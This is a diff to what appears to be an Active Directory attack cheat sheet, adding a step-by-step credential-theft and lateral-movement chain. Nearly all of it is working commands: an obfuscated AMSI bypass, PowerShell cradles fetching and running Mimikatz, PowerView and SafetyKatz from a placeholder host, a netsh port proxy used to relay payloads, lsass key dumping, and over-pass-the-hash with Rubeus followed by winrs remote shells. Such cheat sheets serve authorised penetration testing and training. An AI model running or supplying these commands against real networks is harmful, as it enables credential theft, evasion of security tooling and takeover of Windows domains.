@@ -635,6 +635,11 @@ winrs -r:hostname -u:domain\user
 ```powershell
 # Extract credentials from lsass
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+# Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
+iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)
+# "Over pass the hash" generate tokens from hashes
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
+
 
 # Useful alternatives (less detected using alternative DLLs)
 SafetyKatz.exe "sekurlsa::ekeys"
@@ -696,13 +701,42 @@ c:\tools\Loader.exe -path http://x.x.x.x/SafetyKatz.exe
  c:\tools\AssemblyLoad.exe http://x.x.x.x/Loader.exe -path http://x.x.x.x/SafetyKatz.exe
 ```
 
-- **Invoke-Mimikatz:**
+- *Example of usage*
 ```powershell
-# Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
-iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           
-# "Over pass the hash" generate tokens from hashes
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"'
+# First, setup a HTTP server (apache or HFS) on x.x.x.x with useful binaries
+
+# Download AMSI bypass string 
+iex(iwr http://x.x.x.x/sbloggingbypass.txt -UseBasicParsing)
+
+# Execute AMSI bypass
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+# Download powerview
+iex((New-Object Net.WebClient).DownloadString('http://x.x.x.x/PowervIew.ps1'))
+
+# Connect to other machine and execute commands
+winrs -r:server hostname;whoami
+
+# Download Loader.exe
+iwr http://x.x.x.x/Loader.exe -OutFile c:\users\Public\Loader.exe
+
+#Copy Loader.exe to server (using c$)
+echo F | xcopy c:\users\Public\Loader.exe \\server\c$\users\Public\Loader.exe
+
+# Setup a proxy from server (port 8080) to HTTP Server x.x.x.x port 80
+# This can be useful to execute the AssemblyLoad and Loader chain ($null is piped to end the winrs session)
+$null | winrs -r:server "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=x.x.x.x"
+
+# Then execute Loader connecting to localhost (which is forwarded), downaload safetykatz and execute sekurlsa::ekeys command
+$null | winrs -r:server c:\users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+
+# This expose an admin user AES key for over-pass-the-hash
+Rubeus.exe asktgt /user:svcadmin /aes256:<AESKeys> /opsec /createnetonly:c:\windows\system32\cmd.exe /show /ptt
+# Keep in mind that even if whoami shows a non elevated user, the session has svcadmin permissions (logontype=9)
+# and can be used to remote execute command
+winrs -r server cmd
 ```
+
 
 # Persistence
 
